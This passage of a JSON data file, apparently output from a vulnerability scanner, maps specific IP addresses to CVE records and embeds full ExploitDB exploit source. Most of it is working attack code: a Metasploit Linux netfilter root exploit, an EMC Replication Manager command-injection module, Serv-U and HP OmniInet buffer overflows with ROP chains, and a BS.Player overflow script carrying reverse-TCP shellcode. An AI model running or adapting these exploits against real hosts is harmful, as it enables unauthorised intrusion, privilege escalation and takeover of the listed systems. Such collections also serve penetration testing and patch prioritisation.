*)MMAP_ADDR);\r\n\r\n          void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);\r\n\r\n          memset(shellcode, 0, 0x300000);\r\n\r\n          void *ret = memcpy(shellcode, &privesc, 0x300);\r\n          assert(ret == shellcode);\r\n\r\n          printf(\"[+] Escalating privs...\\n\");\r\n\r\n          int fd = open(\"/dev/ptmx\", O_RDWR);\r\n          close(fd);\r\n\r\n          assert(!getuid());\r\n\r\n          printf(\"[+] We've got root!\");\r\n\r\n          return execl(\"/bin/bash\", \"-sh\", NULL);\r\n      }\r\n    }\r\n\r\n    # the original code printed a line.  However, this is hard to detect due to threading.\r\n    # so instead we can write a file in /tmp to catch.\r\n    decr.gsub!(/printf\\(\"\\[\\+\\] Done\\! Now run \\.\\/pwn\\\\n\"\\);/,\r\n               \"int fd2 = open(\\\"#{env_ready_file}\\\", O_RDWR|O_CREAT, 0777);close(fd2);\" )\r\n\r\n    # patch in to run our payload\r\n    pwn.gsub!(/execl\\(\"\\/bin\\/bash\", \"-sh\", NULL\\);/,\r\n               \"execl(\\\"#{payload_path}\\\", NULL);\")\r\n\r\n    def pwn(payload_path, pwn_file, pwn, compile)\r\n      # lets write our payload since everythings set for priv esc\r\n      vprint_status(\"Writing payload to #{payload_path}\")\r\n      write_file(payload_path, generate_payload_exe)\r\n      cmd_exec(\"chmod 555 #{payload_path}\")\r\n      register_file_for_cleanup(payload_path)\r\n\r\n      # now lets drop part 2, and finish up.\r\n      rm_f pwn_file\r\n      if compile\r\n        print_status \"Writing pwn executable to #{pwn_file}.c\"\r\n        rm_f \"#{pwn_file}.c\"\r\n        write_file(\"#{pwn_file}.c\", pwn)\r\n        cmd_exec(\"gcc #{pwn_file}.c -O2 -o #{pwn_file}\")\r\n        register_file_for_cleanup(\"#{pwn_file}.c\")\r\n      else\r\n        print_status \"Writing pwn executable to #{pwn_file}\"\r\n        write_file(pwn_file, pwn)\r\n      end\r\n      register_file_for_cleanup(pwn_file)\r\n      cmd_exec(\"chmod +x #{pwn_file}; #{pwn_file}\")\r\n    end\r\n\r\n    if not compile # we need to override with our pre-created binary\r\n      # pwn file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-pwn.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      pwn = fd.read(fd.stat.size)\r\n      fd.close\r\n      # desc file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-decr.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      decr = fd.read(fd.stat.size)\r\n      fd.close\r\n\r\n      # overwrite the hardcoded variable names in the compiled versions\r\n      env_ready_file = '/tmp/okDjTFSS'\r\n      payload_path = '/tmp/2016_4997_payload'\r\n    end\r\n\r\n    # check for shortcut\r\n    if datastore['REEXPLOIT']\r\n      pwn(payload_path, pwn_file, pwn, compile)\r\n    else\r\n      rm_f desc_file\r\n      if compile\r\n        print_status \"Writing desc executable to #{desc_file}.c\"\r\n        rm_f \"#{desc_file}.c\"\r\n        write_file(\"#{desc_file}.c\", decr)\r\n        register_file_for_cleanup(\"#{desc_file}.c\")\r\n        output = cmd_exec(\"gcc #{desc_file}.c -m32 -O2 -o #{desc_file}\")\r\n      else\r\n        write_file(desc_file, decr)\r\n      end\r\n      rm_f env_ready_file\r\n      register_file_for_cleanup(env_ready_file)\r\n      #register_file_for_cleanup(desc_file)\r\n      if not file_exist?(desc_file)\r\n        vprint_error(\"gcc failure output: #{output}\")\r\n        fail_with(Failure::Unknown, \"#{desc_file}.c failed to compile\")\r\n      end\r\n      if target.name == \"Ubuntu\"\r\n        vprint_status \"Executing #{desc_file}, may take around 35s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      elsif target.name == \"Fedora\"\r\n        vprint_status \"Executing #{desc_file}, may take around 80s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      end\r\n      cmd_exec(\"chmod +x #{desc_file}; #{desc_file}\")\r\n      sec_waited = 0\r\n\r\n      until sec_waited > datastore['MAXWAIT'] do\r\n        Rex.sleep(1)\r\n        if sec_waited % 10 == 0\r\n          vprint_status(\"Waited #{sec_waited}s so far\")\r\n        end\r\n\r\n        if file_exist?(env_ready_file)\r\n          print_good(\"desc finished, env ready.\")\r\n          pwn(payload_path, pwn_file, pwn, compile)\r\n          return\r\n        end\r\n        sec_waited +=1\r\n      end\r\n    end\r\n  end\r\nend",
                "description": "Linux Kernel 4.6.3 (x86) - 'Netfilter' Local Privilege Escalation (Metasploit)",
                "author": "Metasploit",
                "_id": 40435,
                "source": "ExploitDB",
                "platform": "linux_x86",
                "date": "2016-09-27T00:00:00+00:00",
                "cve": [
                    "CVE-2016-4997"
                ],
                "type": "local",
                "port": 0
            }
        ],
        "CVE-2014-1692": [
            {
                "source": "CVE",
                "_id": "2014-1692",
                "description": "The hash_buffer function in schnorr.c in OpenSSH through 6.4, when Makefile.inc is modified to enable the J-PAKE protocol, does not initialize certain data structures, which might allow remote attackers to cause a denial of service (memory corruption) or have unspecified other impact via vectors that trigger an error condition.",
                "osvdb": [
                    102611
                ],
                "bid": [
                    65230
                ],
                "cve": [
                    "CVE-2014-1692"
                ],
                "msb": []
            }
        ]
    },
    "152.1.38.115": {},
    "152.1.38.177": {
        "CVE-2011-5000": [
            {
                "source": "CVE",
                "_id": "2011-5000",
                "description": "The ssh_gssapi_parse_ename function in gss-serv.c in OpenSSH 5.8 and earlier, when gssapi-with-mic authentication is enabled, allows remote authenticated users to cause a denial of service (memory consumption) via a large value in a certain length field.  NOTE: there may be limited scenarios in which this issue is relevant.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-5000"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4486",
                "description": "Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allow remote attackers to cause a denial of service (device reload) via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4486"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-2581",
                "description": "The ACL implementation in Cisco NX-OS 5.0(2) and 5.0(3) before 5.0(3)N2(1) on Nexus 5000 series switches, and NX-OS before 5.0(3)U1(2a) on Nexus 3000 series switches, does not properly handle comments in conjunction with deny statements, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by sending packets, aka Bug IDs CSCto09813 and CSCtr61490.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-2581"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4487",
                "description": "SQL injection vulnerability in Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allows remote attackers to execute arbitrary SQL commands via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4487"
                ],
                "msb": []
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = GreatRanking\r\n\r\n  include Msf::Exploit::Remote::Tcp\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'           => 'EMC Replication Manager Command Execution',\r\n      'Description'    => %q{\r\n        This module exploits a remote command-injection vulnerability in EMC Replication Manager\r\n        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an\r\n        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected\r\n        products are EMC Replication Manager < 5.3. This module has been successfully tested\r\n        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft\r\n        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested\r\n        against these products.\r\n      },\r\n      'Author'         =>\r\n        [\r\n          'Unknown', #Initial discovery\r\n          'Davy Douhine' #MSF module\r\n        ],\r\n      'License'        => MSF_LICENSE,\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2011-0647' ],\r\n          [ 'OSVDB', '70853' ],\r\n          [ 'BID', '46235' ],\r\n          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],\r\n          [ 'ZDI', '11-061' ]\r\n        ],\r\n      'DisclosureDate' => 'Feb 07 2011',\r\n      'Platform'       => 'win',\r\n      'Arch'           => ARCH_X86,\r\n      'Payload'        =>\r\n        {\r\n          'Space'       => 4096,\r\n          'DisableNops' => true\r\n        },\r\n      'Targets'        =>\r\n        [\r\n          # Tested on Windows XP and Windows 2003\r\n          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]\r\n        ],\r\n      'CmdStagerFlavor' => 'vbs',\r\n      'DefaultOptions' =>\r\n        {\r\n          'WfsDelay' => 5\r\n        },\r\n      'DefaultTarget'  => 0,\r\n      'Privileged'     => true\r\n      ))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RPORT(6542)\r\n      ], self.class)\r\n  end\r\n\r\n  def exploit\r\n    execute_cmdstager({:linemax => 5000})\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    connect\r\n    hello = \"1HELLOEMC00000000000000000000000\"\r\n    vprint_status(\"Sending hello...\")\r\n    sock.put(hello)\r\n    result = sock.get_once || ''\r\n    if result =~ /RAWHELLO/\r\n      vprint_good(\"Expected hello response\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to hello the server\")\r\n    end\r\n\r\n    start_session = \"EMC_Len0000000136<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><ir_message ir_sessionId=0000 ir_type=\\\"ClientStartSession\\\" <ir_version>1</ir_version></ir_message>\"\r\n    vprint_status(\"Starting session...\")\r\n    sock.put(start_session)\r\n    result = sock.get_once || ''\r\n    if result =~ /EMC/\r\n      vprint_good(\"A session has been created. Good.\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to create the session\")\r\n    end\r\n\r\n    run_prog = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?> \"\r\n    run_prog << \"<ir_message ir_sessionId=\\\"01111\\\" ir_requestId=\\\"00000\\\" ir_type=\\\"RunProgram\\\" ir_status=\\\"0\\\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>\"\r\n    run_prog << \"<ir_runProgramAppInfo><?xml version=\"1.0\" encoding=\"UTF-8\"?> <ir_message ir_sessionId=\"00000\" ir_requestId=\"00000\" \"\r\n    run_prog << \"ir_type=\"App Info\" ir_status=\"0\"><IR_groupEntry IR_groupType=\"anywriter\"  IR_groupName=\"CM1109A1\"  IR_groupId=\"1\" \"\r\n    run_prog << \"><?xml version=\"1.0\" encoding=\"UTF-8\"?\t> <ir_message ir_sessionId=\"00000\" \"\r\n    run_prog << \"ir_requestId=\"00000\"ir_type=\"App Info\" ir_status=\"0\"><aa_anywriter_ccr_node>CM1109A1\"\r\n    run_prog << \"</aa_anywriter_ccr_node><aa_anywriter_fail_1018>0</aa_anywriter_fail_1018><aa_anywriter_fail_1019>0\"\r\n    run_prog << \"</aa_anywriter_fail_1019><aa_anywriter_fail_1022>0</aa_anywriter_fail_1022><aa_anywriter_runeseutil>1\"\r\n    run_prog << \"</aa_anywriter_runeseutil><aa_anywriter_ccr_role>2</aa_anywriter_ccr_role><aa_anywriter_prescript>\"\r\n    run_prog << \"</aa_anywriter_prescript><aa_anywriter_postscript></aa_anywriter_postscript><aa_anywriter_backuptype>1\"\r\n    run_prog << \"</aa_anywriter_backuptype><aa_anywriter_fail_447>0</aa_anywriter_fail_447><aa_anywriter_fail_448>0\"\r\n    run_prog << \"</aa_anywriter_fail_448><aa_exchange_ignore_all>0</aa_exchange_ignore_all><aa_anywriter_sthread_eseutil>0&amp\"\r\n    run_prog << \";lt;/aa_anywriter_sthread_eseutil><aa_anywriter_required_logs>0</aa_anywriter_required_logs><aa_anywriter_required_logs_path\"\r\n    run_prog << \"></aa_anywriter_required_logs_path><aa_anywriter_throttle>1</aa_anywriter_throttle><aa_anywriter_throttle_ios>300\"\r\n    run_prog << \"</aa_anywriter_throttle_ios><aa_anywriter_throttle_dur>1000</aa_anywriter_throttle_dur><aa_backup_username>\"\r\n    run_prog << \"</aa_backup_username><aa_backup_password></aa_backup_password><aa_exchange_checksince>1335208339\"\r\n    run_prog << \"</aa_exchange_checksince> </ir_message></IR_groupEntry> </ir_message></ir_runProgramAppInfo>\"\r\n    run_prog << \"<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>\"\r\n    run_prog_header = \"EMC_Len000000\"\r\n    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog\r\n\r\n    vprint_status(\"Executing command....\")\r\n    sock.put(run_prog_packet)\r\n    sock.get_once(-1, 1)\r\n\r\n    end_string = Rex::Text.rand_text_alpha(rand(10)+32)\r\n    sock.put(end_string)\r\n    sock.get_once(-1, 1)\r\n    disconnect\r\n\r\n  end\r\nend",
                "description": "EMC Replication Manager < 5.3 - Command Execution (Metasploit)",
                "author": "Metasploit",
                "_id": 41704,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-02-27T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = NormalRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Egghunter\r\n\tinclude Msf::Exploit::Remote::Ftp\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Serv-U FTP Server <4.2 Buffer Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tThis module exploits a stack buffer overflow in the site chmod command\r\n\t\t\t\tin versions of Serv-U FTP Server prior to 4.2.\r\n\r\n\t\t\t\tYou must have valid credentials to trigger this vulnerability. Exploitation\r\n\t\t\t\talso leaves the service in a non-functional state.\r\n\t\t\t},\r\n\t\t\t'Author'         => 'thelightcosine <thelightcosine[at]metasploit.com>',\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2004-2111'],\r\n\t\t\t\t\t[ 'BID', '9483'],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => true,\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'thread',\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'    => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'Windows 2000 SP0-4 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x750212bc, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 396 } ],\r\n\t\t\t\t\t[ 'Windows XP SP0-1 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x71aa388f, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 394 } ]\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Dec 31 2004',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\tend\r\n\r\n\tdef check\r\n\t\tconnect\r\n\t\tdisconnect\r\n\r\n\t\tif (banner =~ /Serv-U FTP Server v((4.(0|1))|3.\\d)/)\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\t\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\t\tconnect_login\r\n\r\n\t\teggoptions =\r\n\t\t{\r\n\t\t\t:checksum => true,\r\n\t\t\t:eggtag => \"W00T\"\r\n\t\t}\r\n\r\n\t\thunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)\r\n\r\n\r\n\t\tbuffer = \"chmod 777 \"\r\n\t\tbuffer <<  make_nops(target['Offset'] - egg.length - hunter.length)\r\n\t\tbuffer << egg\r\n\t\tbuffer << hunter\r\n\t\tbuffer << \"\\xeb\\xc9\\x41\\x41\"\t#nseh, jump back to egghunter\r\n\t\tbuffer << [target.ret].pack('V')\t#seh\r\n\t\tbuffer << rand_text(5000)\r\n\r\n\t\tprint_status(\"Trying target #{target.name}...\")\r\n\r\n\t\tsend_cmd( ['SITE', buffer] , false)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\n\r\nend",
                "description": "RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18190,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-02T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "#\r\n#\r\n#[+]Exploit Title: Exploit Buffer Overfloe Bsplayer 2.57(UNICODE-SEH)\r\n#[+]Date: 01\\07\\2010\r\n#[+]Author: C4SS!0 G0M3S\r\n#[+]Software Link: http://www.bsplayer.com/services/downlad-free-bsplayer.php?type=2\r\n#[+]Version: 2.57\r\n#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN\r\n#[+]CVE: N/A\r\n#\r\n#\r\n#  #########      ##   #########      #########  ##     ###############\r\n#  #########    ####   #########      #########  ##     ##           ##    \r\n#  ##         ## ##    ##             ##         ##     ##           ## \r\n#  ##        ##  ##    ##             ##         ##     ##           ##\r\n#  ##       ########## ########       ########   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ########      ##    ########      #########   ##     ##           ##\r\n#  ########      ##    ########      #########   \\/     ###############\r\n#                                              \r\n#Created By C4SS!0 G0M3S\r\n#Louredo_@hotmail.com\r\n#www.invasao.com.br\r\n#\r\n#\r\n\r\n\r\nimport os\r\nimport sys\r\nimport time\r\nimport string\r\n\r\nos.system(\"cls\")\r\nos.system(\"color 4f\")\r\n\r\ndef usage():\r\n        print \"\\n\"\r\n        print \"[+]Exploit: Exploit Buffer Overflow Bsplayer(UNICODE-SEH)\"\r\n        print \"[+]Date: 01\\\\07\\\\2010\"\r\n        print \"[+]Author: C4SS!0 G0M3S\"\r\n        print \"[+]Home: www.invasao.com.br\"\r\n        print \"[+]E-mail: Louredo_@hotmail.com\"\r\n        print \"[+]Version: 2.57\"\r\n        print \"[+]Software: Bsplayer 2.57\\n\"\r\n        print \"[-]Note:\"\r\n        print \"TO EXPLOIT THE RUN FILE NAME MUST BE FILE_NAME.M3U\\n\"\r\n\r\n\r\nif((len(sys.argv)!=3) or (int(sys.argv[1])<1) or (int(sys.argv[1])>2)):\r\n        usage()\r\n        print \"Payloads:\\n1 - WinExec(\\\"Calc.exe\\\",0)\\n2 - Reverse_Tcp_Shell\\n\"\r\n        print \"[-]Usage: \"+sys.argv[0]+\" <Playload Number> <File Name>\"\r\n        print \"[-]Exemple: \"+sys.argv[0]+\" 1 Exploit.m3u\"\r\n        sys.exit(0)\r\n\r\nusage()\r\nbuffer = \"\\x42\" * 4102\r\nnseh = \"\\x61\\x6d\"\r\nseh = \"\\xde\\x4e\" #pop ebx - pop ebp - ret at 0x004E00DE [bsplayer.exe]\r\negg_hunter = \"\\x45\\x61\\x45\\x61\\x45\\x50\\x45\\xc3\"\r\n\r\njunk = \"\\x45\" * 1094\r\nprint \"[*]Identifying the length Shellcode\"\r\ntime.sleep(1)\r\nif int(sys.argv[1]) == 2:\r\n\tshellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n\t\"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBNKWY7N4PV9X6PQX1PV9JYNZ9SDMTZTR\" # \r\n\t\"83SY0KT01RPLLLCBPLLT2RLPJX9KKTOX3NZUKKV0VLK3Y3MLRONMMJU2VWC8VQKQSOPTZT3CTK1LPUR6\" #\r\n\t\"KZR65RJC7NPWDLVRZQUMFMV85BXR7BOG8SCKUNXUVMVGIPMKJJZ6XSQ40ORI2UTOWNWRXVF679XJWYPL\" #FROM METASPLOIT FRAMEWORK \r\n\t\"OU2QOXQNN0GGLNM3HJLRVWUSKO4OWMVOZKXLKLY2B3U1BQMPEBVMQEEFULKP12N8GHWH43CROTS2NPPD\" #\r\n\t\"QT0YXLS5MOM3OCKSRWPFLJWWN19PSXXOFKYD7KLN3WYMFFEJY7LO785W6C1TM7MOURUH7EOM1FZTEMOJ\" #SHELLCODE REVERSE_TCP_SHELL ON PORT 4444\r\n\t\"28TUN2LK0SKNTKKPHJSDRKLFONNC2620QXQTRFZUE3UGR8TOL5V3YO47PRSMMBURNNL9MNEHNELX5NOW\" #\r\n\t\"Q8C5UPOLK3BIRSQBOXVDD9STOI8LHBM1Y3PEPOKMQOMKRN8JZIJ3MPJ0VRRYY92VP0DLVJ3TVJFWKSKB\" #PROMPT:\r\n\t\"QCMXW7O30CRZRF7JK7JV4S2SRM9M5RRTOZZVFYQQDKKW1LY7S6LZFJLLZNXMJB685QOJGLNKNITOCZSK\" #\r\n\t\"QITVVPONFL6LN0O1RVBINM6OLML4XL0TNL6RRVN28UOKSULQJXYLLY9NLM57LVDS8NY2PMQ3MORRMHQD\" #C:\\>Telnet 127.0.0.1 4444\r\n\t\"BEINV9QY8U0MN1ZTUPPO3KGMVDOQWLNEUOJLWKE6UPNMBX12QURRNVJN78DYMXKOMHNA\")            # \r\n                                                                                       #\r\nif int(sys.argv[1]) == 1:\r\n        shellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n        \"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBIKY0NQ99GO3LLVRPHLXY2TMTL46QMNR\"\r\n        \"8P1SHN853YXKLKSSHQXL4TENPSHWL3599RX6VNCJUKCH4VNSMM25ZOJP2MLWORBZMMM1DJ5QVO9MQ9W4\"\r\n        \"V30ZUBQWZLFP5KELTXGCLKKMKLE2KZPNG9MOXKMNBNXMKVBK893KGOKSJXOPLPOMS8SR3UTPWKGHXOKT\"\r\n        \"CDN4CMOQG1C34R171NSXML5WVKE7QSN4XL5VJZQM5W8O669OMOK90J9KN0Q31VVLNNOCUN957X7SHNOP\"\r\n        \"YTP3KXWLE3O9XCKXJA\")\r\n\r\nprint \"[*]The Length Shellcode:\"+str(len(shellcode))\r\n\r\ntime.sleep(1)\r\n\r\nshellcode += \"\\x41\" * 5000\r\n\r\nfile = str(sys.argv[2])\r\n\r\npayload = buffer+nseh+seh+egg_hunter+junk+shellcode\r\n\r\nop = \"w\"\r\nprint \"[*]Creating Your File \"+file\r\ntime.sleep(1)\r\ntry:\r\n        f = open(file,op)\r\n        f.write(\"http://\"+payload)\r\n        f.close()\r\n        print \"[*]The File \"+file+\" was Successfully Created\"\r\nexcept:\r\n        print \"[*]Error Creating File \"+file",
                "description": "BS.Player 2.57 - Local Buffer Overflow (SEH Unicode)",
                "author": "C4SS!0 G0M3S",
                "_id": 15934,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-01-07T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: hp_omniinet_4.rb 13096 2011-07-04 22:33:47Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"HP OmniInet.exe Opcode 20 Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability found in HP Data Protector's OmniInet\r\n\t\t\t\tprocess.  By supplying a long string of data as the file path with opcode '20',\r\n\t\t\t\ta buffer overflow can occur when this data is being written on the stack where\r\n\t\t\t\tno proper bounds checking is done beforehand, which results arbitrary code\r\n\t\t\t\texecution under the context of SYSTEM.  This module is also made against systems\r\n\t\t\t\tsuch as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR\r\n\t\t\t\tenabled by default.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => \"$Revision: 13096 $\",\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Oren Isacson',  #Initial discovery, poc\r\n\t\t\t\t\t'muts',          #Initial poc of the ROP exploit w/ dookie\r\n\t\t\t\t\t'dookie',        #Initial poc of the ROP exploit w/ muts\r\n\t\t\t\t\t'sinn3r',        #MSF module with corelanc0d3r  (Also Thx to MC and HD)\r\n\t\t\t\t\t'corelanc0d3r',  #MSF module with sinn3r\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-1865' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.exploit-db.com/exploits/17468/' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],\r\n\t\t\t\t\t[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182' ],\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'        => \"\\x00\",\r\n\t\t\t\t\t'PrependEncoder'  => \"\\x66\\x81\\xc4\\xb8\\x0b\\x61\\x9d\", #add sp, 0xb88; popad; popfd\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => \"process\",\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t#If 'Max' gets too long (ie. 10000 bytes), we can get a busted heap\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on XP SP3 or Win Server 2003',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 2005,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on Win Server 2008',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 1993,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Jun 29 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options([Opt::RPORT(5555)], self.class)\r\n\tend\r\n\r\n\tdef nop\r\n\t\treturn make_nops(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\tconnect\r\n\r\n\t\t#mona.py tekniq\r\n\t\t#https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/\r\n\t\trop = [\r\n\t\t\t#Initial setup\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t#ROP begins here\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # Make EAX readable\r\n\t\t\t0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EBP\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # <- VirtualProtect() found in IAT\r\n\t\t\t0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0b,  # Slide, so next gadget would write to correct stack location\r\n\t\t\t0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # 